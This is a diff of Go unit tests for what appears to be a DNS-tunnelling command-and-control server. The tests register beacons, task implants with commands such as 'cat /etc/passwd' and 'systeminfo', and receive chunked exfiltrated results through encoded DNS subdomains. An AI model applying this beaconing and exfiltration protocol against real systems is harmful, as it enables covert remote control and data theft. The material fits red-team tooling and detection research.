@@ -216,13 +216,13 @@ func TestBeaconQueryRejectsNonLabelDomainSuffix(t *testing.T) {
 	if err != nil {
 		t.Fatal(err)
 	}
-	if response, isC2, _ := c2.processBeaconQuery(encoded+".notexample.com", "127.0.0.1", nil); isC2 || response != "" {
+	if response, isC2, _ := c2.processBeaconQuery(encoded+".notexample.com", "127.0.0.1", nil, "dns"); isC2 || response != "" {
 		t.Fatalf("confusing domain suffix accepted: response=%q isC2=%v", response, isC2)
 	}
 	if got := len(c2.GetBeacons()); got != 0 {
 		t.Fatalf("confusing domain suffix registered %d beacons, want 0", got)
 	}
-	if response, isC2, _ := c2.processBeaconQuery(encoded+".example.com.", "127.0.0.1", nil); !isC2 || response != "ACK" {
+	if response, isC2, _ := c2.processBeaconQuery(encoded+".example.com.", "127.0.0.1", nil, "dns"); !isC2 || response != "ACK" {
 		t.Fatalf("valid absolute query rejected: response=%q isC2=%v", response, isC2)
 	}
 	if got := len(c2.GetBeacons()); got != 1 {
@@ -236,7 +236,7 @@ func TestPlainCheckInCannotDowngradeEncryptedBeacon(t *testing.T) {
 	c2.beacons["victim"] = &Beacon{ID: "victim"}
 
 	msg := "CHK|victim|host|user|linux|amd64|00000"
-	response, handled, _ := c2.processBeaconQuery(base36EncodeString(msg)+".example.com", "127.0.0.1", nil)
+	response, handled, _ := c2.processBeaconQuery(base36EncodeString(msg)+".example.com", "127.0.0.1", nil, "dns")
 	if handled || response != "" {
 		t.Fatalf("plain check-in downgraded encrypted beacon: response=%q handled=%v", response, handled)
 	}
@@ -256,7 +256,7 @@ func TestTaskChunkRequestRequiresRegisteredTaskOwner(t *testing.T) {
 
 	query := func(beaconID string) (string, bool) {
 		msg := fmt.Sprintf("TASKGET|%s|%s|1", beaconID, taskID)
-		response, handled, _ := c2.processBeaconQuery(base36EncodeString(msg)+".example.com", "127.0.0.1", nil)
+		response, handled, _ := c2.processBeaconQuery(base36EncodeString(msg)+".example.com", "127.0.0.1", nil, "dns")
 		return response, handled
 	}
 
@@ -281,7 +281,7 @@ func TestResultDataRequiresRegisteredTaskOwner(t *testing.T) {
 
 	send := func(beaconID string) (string, bool) {
 		msg := fmt.Sprintf("DATA|%s|%s|1|1|forged|00000", beaconID, taskID)
-		response, handled, _ := c2.processBeaconQuery(base36EncodeString(msg)+".example.com", "127.0.0.1", nil)
+		response, handled, _ := c2.processBeaconQuery(base36EncodeString(msg)+".example.com", "127.0.0.1", nil, "dns")
 		return response, handled
 	}
 
@@ -311,7 +311,7 @@ func TestBeaconRegistration(t *testing.T) {
 	// Construct query name: encoded_payload.example.com
 	qname := encoded + ".example.com"
 
-	resp, isC2, _ := c2.processBeaconQuery(qname, "127.0.0.1", nil)
+	resp, isC2, _ := c2.processBeaconQuery(qname, "127.0.0.1", nil, "dns")
 
 	if !isC2 {
 		t.Error("Should be identified as C2 traffic")
@@ -351,7 +351,7 @@ func TestBeaconRegistrationMultiple(t *testing.T) {
 	for _, b := range beacons {
 		data := fmt.Sprintf("CHK|%s|%s|%s|%s|%s", b.id, b.hostname, b.username, b.os, b.arch)
 		encoded, _ := encryptAndEncode(data, c2.aesKey)
-		c2.processBeaconQuery(encoded+".example.com", "127.0.0.1", nil)
+		c2.processBeaconQuery(encoded+".example.com", "127.0.0.1", nil, "dns")
 	}
 
 	registered := c2.GetBeacons()
@@ -367,7 +367,7 @@ func TestBeaconUpdateOnReconnect(t *testing.T) {
 	encoded, _ := encryptAndEncode(beaconData, c2.aesKey)
 
 	// First check-in
-	c2.processBeaconQuery(encoded+".example.com", "192.168.1.1", nil)
+	c2.processBeaconQuery(encoded+".example.com", "192.168.1.1", nil, "dns")
 
 	beacons := c2.GetBeacons()
 	firstSeen := beacons[0].FirstSeen
@@ -377,7 +377,7 @@ func TestBeaconUpdateOnReconnect(t *testing.T) {
 	time.Sleep(10 * time.Millisecond)
 
 	// Second check-in from different IP
-	c2.processBeaconQuery(encoded+".example.com", "192.168.1.2", nil)
+	c2.processBeaconQuery(encoded+".example.com", "192.168.1.2", nil, "dns")
 
 	beacons = c2.GetBeacons()
 	if len(beacons) != 1 {
@@ -406,13 +406,13 @@ func TestTasking(t *testing.T) {
 	// Register beacon first using pipe-delimited format
 	beaconData := "CHK|test-beacon|host1|user1|linux|amd64"
 	encoded, _ := encryptAndEncode(beaconData, c2.aesKey)
-	c2.processBeaconQuery(encoded+".example.com", "127.0.0.1", nil)
+	c2.processBeaconQuery(encoded+".example.com", "127.0.0.1", nil, "dns")
 
 	// Add task
 	c2.AddTaskFromMaster("T1001", "test-beacon", "whoami")
 
 	// Poll for task (same check-in message)
-	resp, _, _ := c2.processBeaconQuery(encoded+".example.com", "127.0.0.1", nil)
+	resp, _, _ := c2.processBeaconQuery(encoded+".example.com", "127.0.0.1", nil, "dns")
 
 	// Response should be TASK|ID|COMMAND
 	if len(resp) < 5 || resp[:5] != "TASK|" {
@@ -431,7 +431,7 @@ func TestTaskingMultiple(t *testing.T) {
 	// Register beacon
 	beaconData := "CHK|test-beacon|host1|user1|linux|amd64"
 	encoded, _ := encryptAndEncode(beaconData, c2.aesKey)
-	c2.processBeaconQuery(encoded+".example.com", "127.0.0.1", nil)
+	c2.processBeaconQuery(encoded+".example.com", "127.0.0.1", nil, "dns")
 
 	// Add multiple tasks
 	c2.AddTaskFromMaster("T1001", "test-beacon", "whoami")
@@ -443,32 +443,32 @@ func TestTaskingMultiple(t *testing.T) {
 	ackTask := func(taskID string) {
 		meta := fmt.Sprintf("RESULT_META|test-beacon|%s|5|1|12345", taskID)
 		enc, _ := encryptAndEncode(meta, c2.aesKey)
-		c2.processBeaconQuery(enc+".example.com", "127.0.0.1", nil)
+		c2.processBeaconQuery(enc+".example.com", "127.0.0.1", nil, "dns")
 	}
 
 	// First poll should get first task
-	resp1, _, _ := c2.processBeaconQuery(encoded+".example.com", "127.0.0.1", nil)
+	resp1, _, _ := c2.processBeaconQuery(encoded+".example.com", "127.0.0.1", nil, "dns")
 	if !strings.Contains(resp1, "whoami") {
 		t.Errorf("First task should be whoami, got %s", resp1)
 	}
 	ackTask("T1001")
 
 	// Second poll should get second task
-	resp2, _, _ := c2.processBeaconQuery(encoded+".example.com", "127.0.0.1", nil)
+	resp2, _, _ := c2.processBeaconQuery(encoded+".example.com", "127.0.0.1", nil, "dns")
 	if !strings.Contains(resp2, "id") {
 		t.Errorf("Second task should be id, got %s", resp2)
 	}
 	ackTask("T1002")
 
 	// Third poll should get third task
-	resp3, _, _ := c2.processBeaconQuery(encoded+".example.com", "127.0.0.1", nil)
+	resp3, _, _ := c2.processBeaconQuery(encoded+".example.com", "127.0.0.1", nil, "dns")
 	if !strings.Contains(resp3, "pwd") {
 		t.Errorf("Third task should be pwd, got %s", resp3)
 	}
 	ackTask("T1003")
 
 	// Fourth poll should get ACK (no more tasks)
-	resp4, _, _ := c2.processBeaconQuery(encoded+".example.com", "127.0.0.1", nil)
+	resp4, _, _ := c2.processBeaconQuery(encoded+".example.com", "127.0.0.1", nil, "dns")
 	if resp4 != "ACK" {
 		t.Errorf("Fourth poll should get ACK, got %s", resp4)
 	}
@@ -493,16 +493,16 @@ func TestResultMetaProcessing(t *testing.T) {
 	// Register beacon and send task
 	beaconData := "CHK|test-beacon|host1|user1|linux|amd64"
 	encoded, _ := encryptAndEncode(beaconData, c2.aesKey)
-	c2.processBeaconQuery(encoded+".example.com", "127.0.0.1", nil)
+	c2.processBeaconQuery(encoded+".example.com", "127.0.0.1", nil, "dns")
 	c2.AddTaskFromMaster("T1001", "test-beacon", "cat /etc/passwd")
 
 	// Deliver task
-	c2.processBeaconQuery(encoded+".example.com", "127.0.0.1", nil)
+	c2.processBeaconQuery(encoded+".example.com", "127.0.0.1", nil, "dns")
 
 	// Send RESULT_META
 	metaData := "RESULT_META|test-beacon|T1001|5000|10"
 	metaEncoded, _ := encryptAndEncode(metaData, c2.aesKey)
-	resp, isC2, _ := c2.processBeaconQuery(metaEncoded+".example.com", "127.0.0.1", nil)
+	resp, isC2, _ := c2.processBeaconQuery(metaEncoded+".example.com", "127.0.0.1", nil, "dns")
 
 	if !isC2 {
 		t.Error("RESULT_META should be recognized as C2 traffic")
@@ -536,22 +536,22 @@ func TestDataChunkProcessing(t *testing.T) {
 	// Register beacon
 	beaconData := "CHK|test-beacon|host1|user1|linux|amd64"
 	encoded, _ := encryptAndEncode(beaconData, c2.aesKey)
-	c2.processBeaconQuery(encoded+".example.com", "127.0.0.1", nil)
+	c2.processBeaconQuery(encoded+".example.com", "127.0.0.1", nil, "dns")
 	c2.AddTaskFromMaster("T1001", "test-beacon", "whoami")
 
 	// Deliver task
-	c2.processBeaconQuery(encoded+".example.com", "127.0.0.1", nil)
+	c2.processBeaconQuery(encoded+".example.com", "127.0.0.1", nil, "dns")
 
 	// Send result meta
 	metaData := "RESULT_META|test-beacon|T1001|100|2"
 	metaEncoded, _ := encryptAndEncode(metaData, c2.aesKey)
-	c2.processBeaconQuery(metaEncoded+".example.com", "127.0.0.1", nil)
+	c2.processBeaconQuery(metaEncoded+".example.com", "127.0.0.1", nil, "dns")
 
 	// Send DATA chunks (format: DATA|beaconID|taskID|chunkIndex|totalChunks|chunkData|timestamp)
 	chunk1Data := base64.StdEncoding.EncodeToString([]byte("root"))
 	dataMsg1 := fmt.Sprintf("DATA|test-beacon|T1001|1|1|%s|%d", chunk1Data, time.Now().Unix())
 	data1Encoded, _ := encryptAndEncode(dataMsg1, c2.aesKey)
-	resp1, isC2, _ := c2.processBeaconQuery(data1Encoded+".example.com", "127.0.0.1", nil)
+	resp1, isC2, _ := c2.processBeaconQuery(data1Encoded+".example.com", "127.0.0.1", nil, "dns")
 
 	if !isC2 {
 		t.Error("DATA should be recognized as C2 traffic")
@@ -573,7 +573,7 @@ func TestStagerSessionCreation(t *testing.T) {
 	stgData := "STG|192.168.1.100|linux|amd64"
 	encoded := base36EncodeString(stgData)
 
-	_, isC2, _ := c2.processBeaconQuery(encoded+".example.com", "192.168.1.100", nil)
+	_, isC2, _ := c2.processBeaconQuery(encoded+".example.com", "192.168.1.100", nil, "dns")
 
 	// Without Master or cache, STG should return false (no cache available)
 	// This is expected behavior
@@ -1037,7 +1037,7 @@ func TestAddDomainUpdateTask(t *testing.T) {
 	// Register beacon
 	beaconData := "CHK|test-beacon|host1|user1|linux|amd64"
 	encoded, _ := encryptAndEncode(beaconData, c2.aesKey)
-	c2.processBeaconQuery(encoded+".example.com", "127.0.0.1", nil)
+	c2.processBeaconQuery(encoded+".example.com", "127.0.0.1", nil, "dns")
 
 	// Add domain update task
 	taskID := c2.AddDomainUpdateTask("test-beacon", "update_domains:[\"new.com\"]")
@@ -1052,7 +1052,7 @@ func TestAddDomainUpdateTask(t *testing.T) {
 	}
 
 	// Poll for task
-	resp, _, _ := c2.processBeaconQuery(encoded+".example.com", "127.0.0.1", nil)
+	resp, _, _ := c2.processBeaconQuery(encoded+".example.com", "127.0.0.1", nil, "dns")
 
 	if !strings.Contains(resp, "update_domains") {
 		t.Errorf("Should receive domain update task, got %s", resp)
@@ -1069,7 +1069,7 @@ func TestFullBeaconWorkflow(t *testing.T) {
 	// 1. Beacon registers
 	beaconData := "CHK|workflow-beacon|workstation1|admin|windows|amd64"
 	encoded, _ := encryptAndEncode(beaconData, c2.aesKey)
-	resp, isC2, _ := c2.processBeaconQuery(encoded+".example.com", "10.0.0.50", nil)
+	resp, isC2, _ := c2.processBeaconQuery(encoded+".example.com", "10.0.0.50", nil, "dns")
 
 	if !isC2 || resp != "ACK" {
 		t.Fatalf("Registration failed: isC2=%v, resp=%s", isC2, resp)
@@ -1079,7 +1079,7 @@ func TestFullBeaconWorkflow(t *testing.T) {
 	c2.AddTaskFromMaster("T2001", "workflow-beacon", "systeminfo")
 
 	// 3. Beacon polls and gets task
-	resp, _, _ = c2.processBeaconQuery(encoded+".example.com", "10.0.0.50", nil)
+	resp, _, _ = c2.processBeaconQuery(encoded+".example.com", "10.0.0.50", nil, "dns")
 	if !strings.HasPrefix(resp, "TASK|") {
 		t.Fatalf("Should get task, got %s", resp)
 	}
@@ -1087,7 +1087,7 @@ func TestFullBeaconWorkflow(t *testing.T) {
 	// 4. Beacon sends result metadata
 	metaMsg := "RESULT_META|workflow-beacon|T2001|1000|3"
 	metaEncoded, _ := encryptAndEncode(metaMsg, c2.aesKey)
-	resp, _, _ = c2.processBeaconQuery(metaEncoded+".example.com", "10.0.0.50", nil)
+	resp, _, _ = c2.processBeaconQuery(metaEncoded+".example.com", "10.0.0.50", nil, "dns")
 	if resp != "ACK" {
 		t.Fatalf("RESULT_META should get ACK, got %s", resp)
 	}
@@ -1099,7 +1099,7 @@ func TestFullBeaconWorkflow(t *testing.T) {
 		chunkIndex := i + 1 // 1-indexed
 		dataMsg := fmt.Sprintf("DATA|workflow-beacon|T2001|%d|%d|%s|%d", chunkIndex, totalChunks, chunkData, time.Now().Unix())
 		dataEncoded, _ := encryptAndEncode(dataMsg, c2.aesKey)
-		resp, _, _ = c2.processBeaconQuery(dataEncoded+".example.com", "10.0.0.50", nil)
+		resp, _, _ = c2.processBeaconQuery(dataEncoded+".example.com", "10.0.0.50", nil, "dns")
 		if resp != "ACK" {
 			t.Fatalf("DATA chunk %d should get ACK, got %s", chunkIndex, resp)
 		}
@@ -1108,7 +1108,7 @@ func TestFullBeaconWorkflow(t *testing.T) {
 	// 6. Beacon sends completion (format: RESULT_COMPLETE|id|taskID|totalChunks|timestamp)
 	completeMsg := fmt.Sprintf("RESULT_COMPLETE|workflow-beacon|T2001|3|%d", time.Now().Unix())
 	completeEncoded, _ := encryptAndEncode(completeMsg, c2.aesKey)
-	resp, _, _ = c2.processBeaconQuery(completeEncoded+".example.com", "10.0.0.50", nil)
+	resp, _, _ = c2.processBeaconQuery(completeEncoded+".example.com", "10.0.0.50", nil, "dns")
 	if resp != "ACK" {
 		t.Fatalf("RESULT_COMPLETE should get ACK, got %s", resp)
 	}
@@ -1122,7 +1122,7 @@ func TestQueryNotForOurDomain(t *testing.T) {
 	encoded, _ := encryptAndEncode(beaconData, c2.aesKey)
 
 	// Use different domain
-	_, isC2, _ := c2.processBeaconQuery(encoded+".other.com", "127.0.0.1", nil)
+	_, isC2, _ := c2.processBeaconQuery(encoded+".other.com", "127.0.0.1", nil, "dns")
 
 	if isC2 {
 		t.Error("Query for other domain should not be processed as C2")
@@ -1154,7 +1154,7 @@ func TestBeaconCHKNotTreatedAsExfil(t *testing.T) {
 	}
 
 	// Verify the beacon query is correctly processed as C2 traffic
-	resp, isC2, _ := c2.processBeaconQuery(qname, "127.0.0.1", nil)
+	resp, isC2, _ := c2.processBeaconQuery(qname, "127.0.0.1", nil, "dns")
 	if !isC2 {
 		t.Error("Beacon CHK query should be processed as C2 traffic")
 	}
@@ -1167,7 +1167,7 @@ func TestInvalidPayload(t *testing.T) {
 	c2 := NewC2Manager(false, "testkey", StagerJitter{}, ":memory:", "example.com")
 
 	// Random garbage that's not valid base36 or encrypted
-	_, isC2, _ := c2.processBeaconQuery("notvalidpayload.example.com", "127.0.0.1", nil)
+	_, isC2, _ := c2.processBeaconQuery("notvalidpayload.example.com", "127.0.0.1", nil, "dns")
 
 	if isC2 {
 		t.Error("Invalid payload should not be processed as C2")
@@ -1356,7 +1356,7 @@ func TestProcessBeaconQuery_UnencryptedCHK(t *testing.T) {
 
 	// Construct a fake DNS query name: <encoded>.test.com
 	qname := encoded + ".test.com"
-	resp, isC2, respEncrypted := c2.processBeaconQuery(qname, "127.0.0.1", nil)
+	resp, isC2, respEncrypted := c2.processBeaconQuery(qname, "127.0.0.1", nil, "dns")
 
 	if !isC2 {
 		t.Fatal("plain-base36 CHK should be recognised as C2 traffic")
@@ -1381,7 +1381,7 @@ func TestProcessBeaconQuery_EncryptedCHK_StillWorks(t *testing.T) {
 	}
 
 	qname := encoded + ".test.com"
-	resp, isC2, respEncrypted := c2.processBeaconQuery(qname, "127.0.0.1", nil)
+	resp, isC2, respEncrypted := c2.processBeaconQuery(qname, "127.0.0.1", nil, "dns")
 
 	if !isC2 {
 		t.Fatal("encrypted CHK should be recognised as C2 traffic")
@@ -1400,7 +1400,7 @@ func TestProcessBeaconQuery_UnknownPlainBase36_Rejected(t *testing.T) {
 
 	unknown := base36EncodeString("UNKNOWN|some|data|00000")
 	qname := unknown + ".test.com"
-	_, isC2, _ := c2.processBeaconQuery(qname, "127.0.0.1", nil)
+	_, isC2, _ := c2.processBeaconQuery(qname, "127.0.0.1", nil, "dns")
 
 	if isC2 {
 		t.Error("unrecognised plain base36 prefix should be rejected (isC2=false)")
@@ -1419,7 +1419,7 @@ func TestProcessBeaconQuery_StagerSTG_IsUnencrypted(t *testing.T) {
 	encoded := base36EncodeString(msg)
 	qname := encoded + ".test.com"
 
-	_, isC2, respEncrypted := c2.processBeaconQuery(qname, "192.168.1.1", nil)
+	_, isC2, respEncrypted := c2.processBeaconQuery(qname, "192.168.1.1", nil, "dns")
 
 	if !isC2 {
 		t.Fatal("plain-base36 CHK should be recognised as C2")
@@ -1444,14 +1444,14 @@ func TestTimestampStripping_FiveDigits(t *testing.T) {
 
 	// 5-digit numeric label appended (new timestamp format)
 	qname5 := encoded + ".12345.test.com"
-	_, isC25, _ := c2.processBeaconQuery(qname5, "10.0.0.1", nil)
+	_, isC25, _ := c2.processBeaconQuery(qname5, "10.0.0.1", nil, "dns")
 	if !isC25 {
 		t.Error("5-digit timestamp label should be stripped, leaving valid encrypted beacon query")
 	}
 
 	// 10-digit numeric label (old format — backward compat)
 	qname10 := encoded + ".1742000000.test.com"
-	_, isC210, _ := c2.processBeaconQuery(qname10, "10.0.0.2", nil)
+	_, isC210, _ := c2.processBeaconQuery(qname10, "10.0.0.2", nil, "dns")
 	if !isC210 {
 		t.Error("10-digit timestamp label should still be stripped (backward compat)")
 	}
@@ -1575,7 +1575,7 @@ func runCHKAndExpectACK(t *testing.T, c2 *C2Manager, beaconID, domain string, cf
 	if qname == "" {
 		t.Fatal("buildQuery returned empty (FQDN too long or encoding failed)")
 	}
-	resp, isC2, _ := c2.processBeaconQuery(qname, "127.0.0.1", nil)
+	resp, isC2, _ := c2.processBeaconQuery(qname, "127.0.0.1", nil, "dns")
 	if !isC2 {
 		t.Fatalf("CHK not recognised as C2 (qname=%q)", qname)
 	}
@@ -1592,7 +1592,7 @@ func runDataQuery(t *testing.T, c2 *C2Manager, beaconID, taskID, chunkData, doma
 	if qname == "" {
 		t.Fatalf("buildQuery returned empty for DATA (chunkIdx=%d, dataLen=%d)", chunkIdx, len(chunkData))
 	}
-	resp, isC2, _ := c2.processBeaconQuery(qname, "127.0.0.1", nil)
+	resp, isC2, _ := c2.processBeaconQuery(qname, "127.0.0.1", nil, "dns")
 	if !isC2 {
 		t.Fatalf("DATA not recognised as C2 (chunk %d/%d)", chunkIdx, totalChunks)
 	}
@@ -1609,7 +1609,7 @@ func runResultMeta(t *testing.T, c2 *C2Manager, beaconID, taskID, domain string,
 	if qname == "" {
 		t.Fatal("buildQuery returned empty for RESULT_META")
 	}
-	resp, isC2, _ := c2.processBeaconQuery(qname, "127.0.0.1", nil)
+	resp, isC2, _ := c2.processBeaconQuery(qname, "127.0.0.1", nil, "dns")
 	if !isC2 {
 		t.Fatal("RESULT_META not recognised as C2")
 	}
@@ -1626,7 +1626,7 @@ func runResultComplete(t *testing.T, c2 *C2Manager, beaconID, taskID, domain str
 	if qname == "" {
 		t.Fatal("buildQuery returned empty for RESULT_COMPLETE")
 	}
-	resp, isC2, _ := c2.processBeaconQuery(qname, "127.0.0.1", nil)
+	resp, isC2, _ := c2.processBeaconQuery(qname, "127.0.0.1", nil, "dns")
 	if !isC2 {
 		t.Fatal("RESULT_COMPLETE not recognised as C2")
 	}
@@ -1678,7 +1678,7 @@ func fullCommsRoundTrip(t *testing.T, label, domain string, cfg testClientCfg) {
 		if qname == "" {
 			t.Fatal("buildQuery empty for second CHK")
 		}
-		resp, isC2, _ := c2.processBeaconQuery(qname, "127.0.0.1", nil)
+		resp, isC2, _ := c2.processBeaconQuery(qname, "127.0.0.1", nil, "dns")
 		if !isC2 {
 			t.Fatal("second CHK not recognised as C2")
 		}
@@ -1723,7 +1723,7 @@ func multiChunkCommsRoundTrip(t *testing.T, label, domain string, cfg testClient
 		// Second CHK to pick up task
 		chk := fmt.Sprintf("CHK|%s|host|user|linux|amd64", beaconID)
 		qname := buildQuery(chk, domain, cfg, key)
-		resp, _, _ := c2.processBeaconQuery(qname, "127.0.0.1", nil)
+		resp, _, _ := c2.processBeaconQuery(qname, "127.0.0.1", nil, "dns")
 		var taskID string
 		if parts := strings.SplitN(resp, "|", 3); len(parts) == 3 {
 			taskID = parts[1]
@@ -1886,7 +1886,7 @@ func TestComms_FormatDoesNotApplyToCHK(t *testing.T) {
 					t.Errorf("CHK subdomain contains hyphen (format was applied): %q", subdomain)
 				}
 
-				resp, isC2, _ := c2.processBeaconQuery(qname, "127.0.0.1", nil)
+				resp, isC2, _ := c2.processBeaconQuery(qname, "127.0.0.1", nil, "dns")
 				if !isC2 || resp != "ACK" {
 					t.Errorf("CHK failed: isC2=%v resp=%q", isC2, resp)
 				}
@@ -1912,7 +1912,7 @@ func TestComms_EncryptedResponseFlag(t *testing.T) {
 			cfg := testClientCfg{encoding: tc.encoding}
 			chk := "CHK|b1b2b3b4|host|user|linux|amd64"
 			qname := buildQuery(chk, "test.com", cfg, key)
-			_, isC2, gotEncr := c2.processBeaconQuery(qname, "127.0.0.1", nil)
+			_, isC2, gotEncr := c2.processBeaconQuery(qname, "127.0.0.1", nil, "dns")
 			if !isC2 {
 				t.Fatal("CHK not recognised")
 			}
@@ -1948,7 +1948,7 @@ func TestComms_DecodeAfterBeaconRegistered_WithFormat(t *testing.T) {
 				c2.AddTaskFromMaster("m-fmt", beaconID, "id")
 				chk := fmt.Sprintf("CHK|%s|host|user|linux|amd64", beaconID)
 				qname := buildQuery(chk, "test.com", cfg, key)
-				resp, _, _ := c2.processBeaconQuery(qname, "127.0.0.1", nil)
+				resp, _, _ := c2.processBeaconQuery(qname, "127.0.0.1", nil, "dns")
 				if !strings.HasPrefix(resp, "TASK|") {
 					t.Fatalf("expected TASK, got %q", resp)
 				}
@@ -1960,7 +1960,7 @@ func TestComms_DecodeAfterBeaconRegistered_WithFormat(t *testing.T) {
 				if qname == "" {
 					t.Fatal("buildQuery empty for RESULT_META with format")
 				}
-				resp, isC2, _ := c2.processBeaconQuery(qname, "127.0.0.1", nil)
+				resp, isC2, _ := c2.processBeaconQuery(qname, "127.0.0.1", nil, "dns")
 				if !isC2 || resp != "ACK" {
 					t.Errorf("RESULT_META failed: isC2=%v resp=%q qname=%q", isC2, resp, qname)
 				}
